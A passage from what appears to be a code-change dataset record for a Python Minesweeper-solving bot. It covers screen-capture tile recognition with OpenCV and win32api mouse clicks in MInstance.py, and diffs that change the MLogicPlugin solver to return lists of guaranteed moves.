self.debugarray=self.grid_array.grid_array[:,:, 0].transpose() k=self.my_logic_plugin.update(self.grid_array) self.cursor_control(k[0], k[1]) end=cv2.getTickCount() total=(end -start) \/ cv2.getTickFrequency() total def reset(self): np.savetxt('lastarray', self.grid_array.grid_array[:,:, 0], delimiter=',') time.sleep(5) self.grid_array=MTileArray((30, 16)) self.flags=0 self.is_complete=False self.cursor_control(MCoordinate(0, 0), 'left') win32api.keybd_event(0x1B, 0, 0, 0) def cursor_control(self, location, action='left'): x_location, y_location=location.values() cursor_offset_correction=MCoordinate(self.tile_length \/ 2, self.tile_length \/ 2) lower_window_real_location=self.my_window_location[0] lower_grid_real_location=lower_window_real_location +self.my_grid_location[0] x_target=lower_grid_real_location.x +cursor_offset_correction.x +self.tile_length * x_location y_target=lower_grid_real_location.y +cursor_offset_correction.y +self.tile_length * y_location win32api.SetCursorPos((x_target, y_target)) time.sleep(.01) if action=='left': win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x_target, y_target, 0, 0) time.sleep(.01) win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, x_target, y_target, 0, 0) elif action=='right': win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, x_target, y_target, 0, 0) time.sleep(.01) win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, x_target, y_target, 0, 0) elif action=='double_left': win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x_target, y_target, 0, 0) time.sleep(.01) win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, x_target, y_target, 0, 0) time.sleep(.01) win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x_target, y_target, 0, 0) time.sleep(.01) win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, x_target, y_target, 0, 0) else: print(\"---------------------------\") print(\"INVALID ACTION SPECIFIED\") print(\"---------------------------\") time.sleep(.01) win32api.SetCursorPos((0, 0)) def update_array(self, screen_snapshot): new_array=np.zeros((30, 16)) lower_window_coords, upper_window_coords=self.my_window_location lower_grid_coords, upper_grid_coords=self.my_grid_location window=screen_snapshot[lower_window_coords.y:upper_window_coords.y, lower_window_coords.x:upper_window_coords.x] grid_crop=window[lower_grid_coords.y:upper_grid_coords.y, lower_grid_coords.x:upper_grid_coords.x] x=grid_crop.shape new_height=(x[0] +16) -(x[0] % 16) new_width=(x[1] +30) -(x[1] % 30) resized=cv2.resize(grid_crop,(new_width, new_height), interpolation=cv2.INTER_AREA) resized_hsv=cv2.cvtColor(resized, cv2.COLOR_BGR2HSV) tt=resized.shape tile_height=round(new_height\/16) tile_width=round(new_width\/30) feature_masks={} for feature, values in MInstance.feature_definitions.items(): lower=np.array(values[0]) upper=np.array(values[1]) grid_mask=cv2.inRange(resized_hsv, lower, upper) grid_blur=cv2.GaussianBlur(grid_mask,(13, 13), 0) grid_bw=cv2.threshold(grid_blur, 50, 255, cv2.THRESH_BINARY)[1] feature_masks[feature]=grid_bw lower=np.array([58, 0, 0]) upper=np.array([177, 62, 255]) grid_mask=cv2.inRange(resized_hsv, lower, upper) grid_blur=cv2.GaussianBlur(grid_mask,(13, 13), 0) grid_bw_empty_tile=cv2.threshold(grid_blur, 50, 255, cv2.THRESH_BINARY)[1] for row in range(0, 16): tile_list=[] for column in range(0, 30): x_target=tile_width *(row+1) y_target=tile_height *(column+1) match=False for feature, values in MInstance.feature_definitions.items(): tile_crop=feature_masks[feature][row * tile_width:x_target, column * tile_height:y_target] match=self._detect_feature(values, tile_crop) if match: new_array[column, row]=int(feature) end=time.time() break if not match: tile_bw=grid_bw_empty_tile[row * tile_width:x_target, column * tile_height:y_target] tile_mean=tile_bw.mean() if tile_mean\/255 >.95: new_array[column, row]=int(0) else: new_array[column, row]=np.NaN self.grid_array.update(new_array) def _detect_window_popup(self, screen_snapshot): lower_window_coords, upper_window_coords=self.my_window_location lower_grid_coords, upper_grid_coords=self.my_grid_location window=screen_snapshot[lower_window_coords.y:upper_window_coords.y, lower_window_coords.x:upper_window_coords.x] grid_crop=window[lower_grid_coords.y:upper_grid_coords.y, lower_grid_coords.x:upper_grid_coords.x] grid_hsv=cv2.cvtColor(grid_crop, cv2.COLOR_BGR2HSV) lower=np.array([0, 0, 218]) upper=np.array([179, 1, 255]) grid_mask=cv2.inRange(grid_hsv, lower, upper) grid_blur=cv2.GaussianBlur(grid_mask,(13, 13), 0) grid_bw=cv2.threshold(grid_blur, 50, 255, cv2.THRESH_BINARY)[1] contours, hierarchy=cv2.findContours(grid_bw, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_NONE) for cont in contours: area=cv2.contourArea(cont) if(self.tile_length * 10)**2 > area >(self.tile_length * 3)**2: return True return False def _detect_feature(self, values, tile_bw): symmetry=np.array(values[2]) contours, hierarchy=cv2.findContours(tile_bw, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_NONE) for cont in contours: area=cv2.contourArea(cont) peri=cv2.arcLength(cont, True) approx=cv2.approxPolyDP(cont,.05 * peri, True) if(self.tile_length ** 2)\/15 < area <(self.tile_length ** 2)\/2: moment=cv2.moments(cont) avg_x=int(moment[\"m10\"] \/ moment[\"m00\"]) avg_y=int(moment[\"m01\"] \/ moment[\"m00\"]) if symmetry[0] or symmetry[1]: x, y, w, h=cv2.boundingRect(cont) tile_feature_crop=tile_bw[y:y +h, x:x +w] top_bottom_symmetry=self._detect_symmetry(tile_feature_crop, 1) left_right_symmetry=self._detect_symmetry(tile_feature_crop, 0) if symmetry[0] and not symmetry[1]: if top_bottom_symmetry >.6 and left_right_symmetry <.75: return True else: return False if symmetry[1] and not symmetry[0]: if left_right_symmetry >.75 and top_bottom_symmetry <.6: return True else: return False if symmetry[0] and symmetry[1]: if left_right_symmetry >.75 and top_bottom_symmetry >.6: return True else: return False return True return False @staticmethod def _detect_symmetry(tile_of_interest, is_vertical): nrow, ncol=tile_of_interest.shape if nrow % 2 !=0: tile_of_interest=tile_of_interest[:-1,:] if ncol % 2 !=0: tile_of_interest=tile_of_interest[:,:-1] nrow, ncol=tile_of_interest.shape rsplit, csplit=nrow \/\/ 2, ncol \/\/ 2 top_bottom_symmetry=0 left_right_symmetry=0 if is_vertical: tile_upperhalf=tile_of_interest[:rsplit,:] tile_lowerhalf=tile_of_interest[rsplit:,:] tile_upperhalf_flipped=np.flip(tile_upperhalf, 0) top_bottom_intersection=cv2.bitwise_and(tile_lowerhalf, tile_upperhalf_flipped) top_bottom_union=cv2.bitwise_or(tile_lowerhalf, tile_upperhalf_flipped) top_bottom_symmetry=cv2.countNonZero(top_bottom_intersection) \/ \\ cv2.countNonZero(top_bottom_union) return top_bottom_symmetry if not is_vertical: tile_lefthalf=tile_of_interest[:,:csplit] tile_righthalf=tile_of_interest[:, csplit:] tile_lefthalf_flipped=np.flip(tile_lefthalf, 1) left_right_intersection=cv2.bitwise_and(tile_righthalf, tile_lefthalf_flipped) left_right_union=cv2.bitwise_or(tile_righthalf, tile_lefthalf_flipped) left_right_symmetry=cv2.countNonZero(left_right_intersection) \/ \\ cv2.countNonZero(left_right_union) return left_right_symmetry ","sourceWithComments":"\"\"\"\nMInstance class\nIndependent instance of a minesweeper game\ncontains information about a single game of minesweeper on the screen\n\n\"\"\"\nimport cv2\nimport numpy as np\nimport MLogicPlugin_Debug\nimport math\nimport time\nimport pyautogui\nfrom MCoordinate import MCoordinate\nfrom MLogicPlugin import MLogicPlugin\nimport time\nimport win32api\nimport win32con\nfrom MTileArray import MTileArray\n\n\nclass MInstance:\n    # flag must be last or 1 will (sometimes) overwrite it, this is a hacky solution but it should work fine\n    # feature definiton value is tuple of (lower-hsv, upper-hsv, symmetry[TB,LR] )\n\n    feature_definitions = {'1': ([85, 66, 130], [117, 255, 255], [0, 0]),\n                           '2': ([44, 162, 87], [66, 255, 158], [0, 0]),\n                           '3': ([0, 101, 144], [37, 255, 202], [1, 0]),  # 3 SOMETIMES SHOWN AS 7\n                           '4': ([97, 232, 64], [161, 255, 217], [0, 0]),\n                           '5': ([0, 62, 107], [37, 255, 144], [0, 0]),\n                           '6': ([63, 175, 96], [101, 255, 188], [0, 0]),\n                           '8': ([0, 101, 144], [37, 255, 202], [1, 1]),\n                           '7': ([0, 101, 144], [37, 255, 202], [0, 0]),\n                           '99': ([0, 77, 188], [59, 255, 255], [0, 0])  # FLAG DETECTION SOMETIMES FAILING\n                           }\n    # feature_definitions = {'1':  ([85, 66, 130], [117, 255, 255], [0, 0])}\n    id = 0\n\n    def __init__(self, location_tuple):\n        # locations (low,high)\n        self.my_window_location, self.my_grid_location, self.tile_length = location_tuple\n        self.grid_array = MTileArray((30, 16))\n        self.debugarray = self.grid_array.grid_array[:, :, 0].transpose()  # DEBUG PURPOSES\n        self.flags = 0\n        self.is_complete = False\n        self.my_logic_plugin = MLogicPlugin(self.grid_array)\n        self.id = MInstance.id\n        MInstance.id += 1\n\n    def get_id(self):\n        print(self.id)\n\n    def update(self, screen_snapshot):\n        # 1) Receives screen snapshot\n        # 2) Checks for game end popup\n        # 2) Updates own array\n        # 3) Uses logic plugin\n        # 4) Cursor action\n\n        start = cv2.getTickCount()\n\n        if self._detect_window_popup(screen_snapshot):\n            self.is_complete = True\n            return\n        self.update_array(screen_snapshot)  # DEBUG: OLD METHOD ~.32 SEC\n\n        self.debugarray = self.grid_array.grid_array[:, :, 0].transpose()  # DEBUG PURPOSES\n\n        k = self.my_logic_plugin.update(self.grid_array)\n\n        self.cursor_control(k[0], k[1])\n        end = cv2.getTickCount()\n        total = (end - start) \/ cv2.getTickFrequency()\n        total\n\n        # self.cursor_control((5, 5), 'left')\n\n    def reset(self):\n        np.savetxt('lastarray', self.grid_array.grid_array[:, :, 0], delimiter=',')\n        time.sleep(5)\n        self.grid_array = MTileArray((30, 16))\n        self.flags = 0\n        self.is_complete = False\n        self.cursor_control(MCoordinate(0, 0), 'left')  # ensures the correct window is selected\n        win32api.keybd_event(0x1B, 0, 0, 0)   # escape key\n        # pyautogui.press('escape')  # pressing escape while a window popup is active will start a new game.\n\n    def cursor_control(self, location, action='left'):  # tells cursor to perform action at specific array[x,y] location.\n        x_location, y_location = location.values()\n        cursor_offset_correction = MCoordinate(self.tile_length \/ 2, self.tile_length \/ 2)\n        lower_window_real_location = self.my_window_location[0]\n        lower_grid_real_location = lower_window_real_location + self.my_grid_location[0]\n        x_target = lower_grid_real_location.x + cursor_offset_correction.x + self.tile_length * x_location\n        y_target = lower_grid_real_location.y + cursor_offset_correction.y + self.tile_length * y_location\n        # print(f\"CURSOR DEBUG: ACTION ={action}, LOCATION: {location.values()}\")\n        win32api.SetCursorPos((x_target, y_target))\n        time.sleep(.01)\n\n        if action == 'left':\n            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x_target, y_target, 0, 0)\n            time.sleep(.01)\n            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, x_target, y_target, 0, 0)\n\n        elif action == 'right':\n            win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, x_target, y_target, 0, 0)\n            time.sleep(.01)\n            win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, x_target, y_target, 0, 0)\n\n        elif action == 'double_left':\n            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x_target, y_target, 0, 0)\n            time.sleep(.01)\n            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, x_target, y_target, 0, 0)\n            time.sleep(.01)\n            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x_target, y_target, 0, 0)\n            time.sleep(.01)\n            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, x_target, y_target, 0, 0)\n\n        else:\n            print(\"---------------------------\")\n            print(\"INVALID ACTION SPECIFIED\")\n            print(\"---------------------------\")\n        time.sleep(.01)\n        win32api.SetCursorPos((0, 0))\n\n    def update_array(self, screen_snapshot):\n        new_array = np.zeros((30, 16))\n        #  process new screenshot into usable form\n        lower_window_coords, upper_window_coords = self.my_window_location\n        lower_grid_coords, upper_grid_coords = self.my_grid_location\n        window = screen_snapshot[lower_window_coords.y:upper_window_coords.y,\n                 lower_window_coords.x:upper_window_coords.x]\n        grid_crop = window[lower_grid_coords.y:upper_grid_coords.y,\n                    lower_grid_coords.x:upper_grid_coords.x]\n\n        x = grid_crop.shape\n        new_height = (x[0] + 16) - (x[0] % 16)\n        new_width = (x[1] + 30) - (x[1] % 30)\n\n        resized = cv2.resize(grid_crop, (new_width, new_height), interpolation=cv2.INTER_AREA)\n        resized_hsv = cv2.cvtColor(resized, cv2.COLOR_BGR2HSV)\n        tt = resized.shape\n\n        tile_height = round(new_height\/16)\n        tile_width = round(new_width\/30)\n        # tile_width = round(grid_width \/ 30)\n        # tile_height = round(grid_height \/ 16)\n        # tile_length = max(tile_height, tile_width)  # ensuring h and w are equal prevents drift from occuring\n\n        # cv2.imshow(\"resized\", resized)\n        # cv2.imshow(\"gridcop\", grid_crop)\n        # cv2.waitKey(0)\n\n        # create feature masks for whole grid that can be sliced to the individual tiles\n        feature_masks = {}\n        for feature, values in MInstance.feature_definitions.items():\n            lower = np.array(values[0])\n            upper = np.array(values[1])\n            grid_mask = cv2.inRange(resized_hsv, lower, upper)\n            # snapshot_gray = cv2.cvtColor(mask, cv2.COLOR_BGR2GRAY)  # set to grayscale\n            grid_blur = cv2.GaussianBlur(grid_mask, (13, 13), 0)  # blur\n            grid_bw = cv2.threshold(grid_blur, 50, 255, cv2.THRESH_BINARY)[1]\n            feature_masks[feature] = grid_bw\n            # cv2.imshow(\"grid_masks\", grid_bw)\n            # cv2.waitKey(0)\n\n        # create mask for empty tile, as its a special case it is separate\n\n        lower = np.array([58, 0, 0])\n        upper = np.array([177, 62, 255])\n        grid_mask = cv2.inRange(resized_hsv, lower, upper)\n        grid_blur = cv2.GaussianBlur(grid_mask, (13, 13), 0)  # blur\n        grid_bw_empty_tile = cv2.threshold(grid_blur, 50, 255, cv2.THRESH_BINARY)[1]\n\n        # DEBUG: ABOVE HERE TAKES APPROX .0737\n        # DEBUG: TOTAL TIME FOR BELOW SECTION IS .35\n        # DEBUG: APPROX TIME FOR 1 TILE OF BELOW CODE IS : .000978\n\n        for row in range(0, 16):\n            tile_list = []\n            for column in range(0, 30):\n                x_target = tile_width * (row+1)\n                y_target = tile_height * (column+1)\n                # cv2.imshow(\"tile\", tile_crop)\n                # cv2.waitKey(0)\n                match = False\n                for feature, values in MInstance.feature_definitions.items():\n                    tile_crop = feature_masks[feature][row * tile_width:x_target, column * tile_height:y_target]\n                    match = self._detect_feature(values, tile_crop)\n                    if match:\n                        new_array[column, row] = int(feature)\n                        end = time.time()\n                        break\n\n                if not match:\n                    # detecting 0 tiles requires an alternative method since contour detection fucks shit up fam.\n                    tile_bw = grid_bw_empty_tile[row * tile_width:x_target, column * tile_height:y_target]\n                    # tile_hsv = cv2.cvtColor(tile_crop, cv2.COLOR_BGR2HSV)\n                    # lower = np.array([58, 0, 0])\n                    # upper = np.array([177, 62, 255])\n                    # mask = cv2.inRange(tile_hsv, lower, upper)\n                    # tile_blur = cv2.GaussianBlur(mask, (13, 13), 0)  # blur\n                    # tile_bw = cv2.threshold(tile_blur, 50, 255, cv2.THRESH_BINARY)[1]\n                    tile_mean = tile_bw.mean()\n                    if tile_mean\/255 > .95:\n                        new_array[column, row] = int(0)\n                    else:\n                        new_array[column, row] = np.NaN\n        self.grid_array.update(new_array)\n\n    def _detect_window_popup(self, screen_snapshot):  # this would occur on a won or lost game. Must differentiate between win \/ lose\n        lower_window_coords, upper_window_coords = self.my_window_location\n        lower_grid_coords, upper_grid_coords = self.my_grid_location\n        window = screen_snapshot[lower_window_coords.y:upper_window_coords.y,\n                                 lower_window_coords.x:upper_window_coords.x]\n        grid_crop = window[lower_grid_coords.y:upper_grid_coords.y,\n                           lower_grid_coords.x:upper_grid_coords.x]\n        grid_hsv = cv2.cvtColor(grid_crop, cv2.COLOR_BGR2HSV)\n        lower = np.array([0, 0, 218])\n        upper = np.array([179, 1, 255])\n        grid_mask = cv2.inRange(grid_hsv, lower, upper)\n        grid_blur = cv2.GaussianBlur(grid_mask, (13, 13), 0)  # blur\n        grid_bw = cv2.threshold(grid_blur, 50, 255, cv2.THRESH_BINARY)[1]\n        contours, hierarchy = cv2.findContours(grid_bw, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_NONE)\n        for cont in contours:\n            area = cv2.contourArea(cont)\n            if (self.tile_length * 10)**2 > area > (self.tile_length * 3)**2:\n                return True\n        return False\n\n    def _detect_feature(self, values, tile_bw):\n\n        # lower = np.array(values[0])\n        # upper = np.array(values[1])\n        symmetry = np.array(values[2])\n        # mask = cv2.inRange(tile_hsv, lower, upper)\n        #\n        # # snapshot_gray = cv2.cvtColor(mask, cv2.COLOR_BGR2GRAY)  # set to grayscale\n        # tile_blur = cv2.GaussianBlur(mask, (13, 13), 0)  # blur\n        # tile_bw = cv2.threshold(tile_blur, 50, 255, cv2.THRESH_BINARY)[1]\n        #\n\n        # cv2.imshow(\"BW\", tile_bw)\n        # cv2.waitKey(0)\n\n        contours, hierarchy = cv2.findContours(tile_bw, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_NONE)\n        for cont in contours:\n            area = cv2.contourArea(cont)\n            peri = cv2.arcLength(cont, True)\n            approx = cv2.approxPolyDP(cont, .05 * peri, True)\n            # cv2.drawContours(tile_hsv, [approx], -1, (0, 255, 0), 3)\n            if (self.tile_length ** 2)\/15 < area < (self.tile_length ** 2)\/2:\n\n            # if 10 < area:  # TEMPORARY DEBUG SWITCH BACK TO ORIGINAL\n                moment = cv2.moments(cont)\n                avg_x = int(moment[\"m10\"] \/ moment[\"m00\"])\n                avg_y = int(moment[\"m01\"] \/ moment[\"m00\"])\n\n                if symmetry[0] or symmetry[1]:\n\n                    x, y, w, h = cv2.boundingRect(cont)\n                    tile_feature_crop = tile_bw[y:y + h, x:x + w]\n                    # cv2.drawContours(tile_hsv, [approx], -1, (0, 255, 0), 3)\n\n                    top_bottom_symmetry = self._detect_symmetry(tile_feature_crop, 1)\n                    left_right_symmetry = self._detect_symmetry(tile_feature_crop, 0)\n\n                    # if only top-bottom symmetry required\n                    if symmetry[0] and not symmetry[1]:\n                        if top_bottom_symmetry > .6 and left_right_symmetry < .75:\n                            # detected_coordinates.append(MCoordinate(avg_x, avg_y))\n                            return True\n                        else:\n                            # cv2.imshow(\"tile\", tile_bw)\n                            # cv2.waitKey(0)\n                            return False\n\n                    # if only left-right symmetry required\n                    if symmetry[1] and not symmetry[0]:\n                        if left_right_symmetry > .75 and top_bottom_symmetry < .6:\n                            # detected_coordinates.append(MCoordinate(avg_x, avg_y))\n                            return True\n                        else:\n                            return False\n\n                    # if both symmetry required\n                    if symmetry[0] and symmetry[1]:\n                        if left_right_symmetry > .75 and top_bottom_symmetry > .6:\n                            # detected_coordinates.append(MCoordinate(avg_x, avg_y))\n                            return True\n                        else:\n                            return False\n                # cv2.circle(snapshot_hsv, (avg_x, avg_y), radius=8, color=(255, 255, 0), thickness = -1)\n                return True\n                # detected_coordinates.append(MCoordinate(avg_x, avg_y))\n\n        return False\n\n    @staticmethod\n    def _detect_symmetry(tile_of_interest, is_vertical):\n\n        # cv2.imshow(\"tileofinterest\", tile_of_interest)\n        # cv2.waitKey(0)\n\n        nrow, ncol = tile_of_interest.shape\n        # removes a row or col if total is odd, otherwise it will break\n        if nrow % 2 != 0:\n            tile_of_interest = tile_of_interest[:-1, :]\n        if ncol % 2 != 0:\n            tile_of_interest = tile_of_interest[:, :-1]\n        nrow, ncol = tile_of_interest.shape\n\n        rsplit, csplit = nrow \/\/ 2, ncol \/\/ 2\n\n        top_bottom_symmetry = 0\n        left_right_symmetry = 0\n\n        if is_vertical:\n            tile_upperhalf = tile_of_interest[:rsplit, :]\n            tile_lowerhalf = tile_of_interest[rsplit:, :]\n            tile_upperhalf_flipped = np.flip(tile_upperhalf, 0)\n            top_bottom_intersection = cv2.bitwise_and(tile_lowerhalf, tile_upperhalf_flipped)\n            top_bottom_union = cv2.bitwise_or(tile_lowerhalf, tile_upperhalf_flipped)\n            top_bottom_symmetry = cv2.countNonZero(top_bottom_intersection) \/ \\\n                                  cv2.countNonZero(top_bottom_union)\n\n\n            # cv2.imshow(\"tile_upperhalf_flipped\", tile_upperhalf_flipped)\n            # cv2.imshow(\"tile_lowerhalf\", tile_lowerhalf)\n            # cv2.waitKey(0)\n            return top_bottom_symmetry\n\n        if not is_vertical:\n            tile_lefthalf = tile_of_interest[:, :csplit]\n            tile_righthalf = tile_of_interest[:, csplit:]\n            tile_lefthalf_flipped = np.flip(tile_lefthalf, 1)\n            left_right_intersection = cv2.bitwise_and(tile_righthalf, tile_lefthalf_flipped)\n            left_right_union = cv2.bitwise_or(tile_righthalf, tile_lefthalf_flipped)\n            left_right_symmetry = cv2.countNonZero(left_right_intersection) \/ \\\n                                  cv2.countNonZero(left_right_union)\n\n            # cv2.imshow(\"tile_lefthalg_flipped\", tile_lefthalf_flipped)\n            # cv2.imshow(\"tile_righthalf\", tile_righthalf)\n            # cv2.waitKey(0)\n            return left_right_symmetry\n"},"\/MLogicPlugin.py":{"changes":[{"diff":"\n Though this was originally just a function, it has been made a class to make it easier to act upon previous moves\n Having this isolated from the rest of the code allows for increased readability and allows for implementation of new\n solving logic without breaking and other parts of the code\n-This class can have whatever you want in it as long as it contains an update function that returns (location, action)\n+This class can have whatever you want in it as long as it contains an update function that returns list(location, action)\n \n WANT:\n - goes down the list in order. if one is true it will start over.\n","add":1,"remove":1,"filename":"\/MLogicPlugin.py","badparts":["This class can have whatever you want in it as long as it contains an update function that returns (location, action)"," goes down the list in order. if one is true it will start over."],"goodparts":["This class can have whatever you want in it as long as it contains an update function that returns list(location, action)"]},{"diff":"\n \n         self.grid_array = grid_array\n         focus = self.previous_focus\n-        location, action = self.logic_flow(focus)\n-        return location, action\n+        actionlist = self.logic_flow(focus)\n+        return actionlist\n \n     def logic_flow(self, focus):  # this function is recursive\n \n","add":2,"remove":2,"filename":"\/MLogicPlugin.py","badparts":["        location, action = self.logic_flow(focus)","        return location, action"],"goodparts":["        actionlist = self.logic_flow(focus)","        return actionlist"]},{"diff":"\n                     if np.isnan(tile_info[0]):\n                         print(location.values(), \"RULE1 RETURN\", tile_info[0])\n                         self.previous_focus = focus\n-                        return location, 'right'\n+                        return [(location, 'right')]\n \n         # \"RULE 2\"\n         else:\n","add":1,"remove":1,"filename":"\/MLogicPlugin.py","badparts":["                        return location, 'right'"],"goodparts":["                        return [(location, 'right')]"]},{"diff":"\n                 if np.isnan(tile_info[0]):\n                     print(focus.values(), \"RULE2 RETURN\")\n                     self.previous_focus = focus\n-                    return focus, 'double_left'\n+                    return [(focus, 'double_left')]  # TODO: IS THIS RIGHT???\n \n                     # print(location.values(), \"RULE2 RETURN\")\n                     # self.previous_focus = focus\n","add":1,"remove":1,"filename":"\/MLogicPlugin.py","badparts":["                    return focus, 'double_left'"],"goodparts":["                    return [(focus, 'double_left')]  # TODO: IS THIS RIGHT???"]},{"diff":"\n \n                         # offset, probability, action = self.backtracking_method(subplot)\n                         # print(result)\n-                        offset, probability, action = self.brute_force_method(sub_array)  # RUN BRUTE FORCE METHOD ON IT\n+                        bf_list = self.brute_force_method(sub_array)  # RUN BRUTE FORCE METHOD ON IT\n+\n+                        if len(bf_list) > 1 or bf_list[0][1] == 1:\n+\n+                            rem_prob = []\n+                            for item in bf_list:\n+                                os, prob, act = item\n+                                rem_prob.append((rel_location + os, act))\n+                            print(f\"Return guaranteed list of length {len(rem_prob)}\")\n+                            return rem_prob\n \n-                        if probability == 1:\n-                            print(f\"LOCATION: {(rel_location + offset).values()} PROBABILITY: {probability}\")\n-                            return rel_location + offset, action\n                         else:\n-                            section_results.append((rel_location + offset, probability, action))  # ADD TO RESULTS\n+                            os, prob, act = bf_list[0]\n+                            section_results.append((rel_location + os, prob, act))  # ADD TO RESULTS\n \n                     else:  # occurs when all possible starting locations have been exhausted.\n                         self.previous_focus = focus\n","add":12,"remove":5,"filename":"\/MLogicPlugin.py","badparts":["                        offset, probability, action = self.brute_force_method(sub_array)  # RUN BRUTE FORCE METHOD ON IT","                        if probability == 1:","                            print(f\"LOCATION: {(rel_location + offset).values()} PROBABILITY: {probability}\")","                            return rel_location + offset, action","                            section_results.append((rel_location + offset, probability, action))  # ADD TO RESULTS"],"goodparts":["                        bf_list = self.brute_force_method(sub_array)  # RUN BRUTE FORCE METHOD ON IT","                        if len(bf_list) > 1 or bf_list[0][1] == 1:","                            rem_prob = []","                            for item in bf_list:","                                os, prob, act = item","                                rem_prob.append((rel_location + os, act))","                            print(f\"Return guaranteed list of length {len(rem_prob)}\")","                            return rem_prob","                            os, prob, act = bf_list[0]","                            section_results.append((rel_location + os, prob, act))  # ADD TO RESULTS"]},{"diff":"\n                         print(\"UN-GUARANTEED MOVE\")\n                         print(f\"POSSIBLE MOVES: {len(probability)}\")\n                         print(f\"LOCATION: {sub_plot_location[max_index].values()} PROBABILITY: {max_probability}\")\n-                        return sub_plot_location[max_index], action[max_index]\n+                        return [(sub_plot_location[max_index], action[max_index])]\n \n                 # cv2.waitKey(0)\n         #  ##### PART 5) #####\n         print('ENTERING PART 5')\n         print(\"RANDOM RETURN\")\n-        return self.grid_array.get_random_unrevealed_location(), \"left\"\n+        return [(self.grid_array.get_random_unrevealed_location(), \"left\")]\n \n     def new_create_subset(self, focus):\n \n","add":2,"remove":2,"filename":"\/MLogicPlugin.py","badparts":["                        return sub_plot_location[max_index], action[max_index]","        return self.grid_array.get_random_unrevealed_location(), \"left\""],"goodparts":["                        return [(sub_plot_location[max_index], action[max_index])]","        return [(self.grid_array.get_random_unrevealed_location(), \"left\")]"]},{"diff":"\n         return sub_array  # return  cleaned sub array\n \n     @staticmethod\n-    def split_subset(subset):\n+    def split_subarray(sub_array):\n         subset_list = []\n         row_num, col_num = np.shape(subset)\n         if row_num % 2 != 0:\n","add":1,"remove":1,"filename":"\/MLogicPlugin.py","badparts":["    def split_subset(subset):"],"goodparts":["    def split_subarray(sub_array):"]},{"diff":"\n             subset_list.append((MCoordinate(0, 0), left_subplot))\n             subset_list.append((MCoordinate(0, int(col_num \/ 2)), right_subplot))\n \n-\n         return subset_list  # returns offset (for each) from original subset and the split subsets.\n \n     @staticmethod\n-    def brute_force_method(subarray):  # TODO: Update this function.\n+    def brute_force_method(subarray):  # TODO: ALLOW MULTIPLE RETURNS FROM ONE BRUTE FORCE.\n         # Handles a subarray of the grid. Generates all 2^n, n= # unrevealed tiles possible mine layouts.\n         # Validate each layout to determine which ones are possible\n         # Find proportion of valid layouts with a mine for each square.\n","add":1,"remove":2,"filename":"\/MLogicPlugin.py","badparts":["    def brute_force_method(subarray):  # TODO: Update this function."],"goodparts":["    def brute_force_method(subarray):  # TODO: ALLOW MULTIPLE RETURNS FROM ONE BRUTE FORCE."]},{"diff":"\n         column_sums = valid_combination_array.sum(axis=0)\n         column_proportions = column_sums\/len(valid_combination_array)\n \n-        max_value = np.max(column_proportions)\n-        max_value_position = np.argmax(column_proportions)\n+        one_locs = np.argwhere(column_proportions == 1)\n+        zero_locs = np.argwhere(column_proportions == 0)\n+        return_locs = []\n \n-        min_value = np.min(column_proportions)\n-        min_value_position = np.argmin(column_proportions)\n+        for loc in one_locs:\n+            location = MCoordinate(unrevealed_locations[0][loc[0]],\n+                                   unrevealed_locations[1][loc[0]])\n+            return_locs.append((location, 1, 'right'))\n+\n+        for loc in zero_locs:\n+            location = MCoordinate(unrevealed_locations[0][loc[0]],\n+                                   unrevealed_locations[1][loc[0]])\n+            return_locs.append((location, 1, 'left'))\n \n-        if np.isnan(min_value) or np.isnan(max_value):\n-            print(\"POOPOO\")\n+        if return_locs:\n+            return return_locs\n \n-        if min_value == 0:\n-            location = MCoordinate(unrevealed_locations[0][min_value_position],\n-                                   unrevealed_locations[1][min_value_position])\n+        # max_value = np.max(column_proportions)\n+        # max_value_position = np.argmax(column_proportions)\n \n-            print(f\"PROB: {1-min_value}\")\n-            return location, 1-min_value, 'left'\n+        min_value = np.min(column_proportions)\n+        min_value_position = np.argmin(column_proportions)\n \n-        if max_value == 1:\n-            location = MCoordinate(unrevealed_locations[0][max_value_position],\n-                                   unrevealed_locations[1][max_value_position])\n-            print(f\"PROB: {max_value}\")\n-            return location, max_value, 'right'\n+        # if np.isnan(min_value) or np.isnan(max_value):\n+        #     print(\"POOPOO\")\n \n         location = MCoordinate(unrevealed_locations[0][min_value_position],\n                                unrevealed_locations[1][min_value_position])\n         print(f\"PROB: {1-min_value}\")\n-        return location, 1-min_value, 'left'\n+        return [(location, 1-min_value, 'left')]\n","add":21,"remove":17,"filename":"\/MLogicPlugin.py","badparts":["        max_value = np.max(column_proportions)","        max_value_position = np.argmax(column_proportions)","        min_value = np.min(column_proportions)","        min_value_position = np.argmin(column_proportions)","        if np.isnan(min_value) or np.isnan(max_value):","            print(\"POOPOO\")","        if min_value == 0:","            location = MCoordinate(unrevealed_locations[0][min_value_position],","                                   unrevealed_locations[1][min_value_position])","            print(f\"PROB: {1-min_value}\")","            return location, 1-min_value, 'left'","        if max_value == 1:","            location = MCoordinate(unrevealed_locations[0][max_value_position],","                                   unrevealed_locations[1][max_value_position])","            print(f\"PROB: {max_value}\")","            return location, max_value, 'right'","        return location, 1-min_value, 'left'"],"goodparts":["        one_locs = np.argwhere(column_proportions == 1)","        zero_locs = np.argwhere(column_proportions == 0)","        return_locs = []","        for loc in one_locs:","            location = MCoordinate(unrevealed_locations[0][loc[0]],","                                   unrevealed_locations[1][loc[0]])","            return_locs.append((location, 1, 'right'))","        for loc in zero_locs:","            location = MCoordinate(unrevealed_locations[0][loc[0]],","                                   unrevealed_locations[1][loc[0]])","            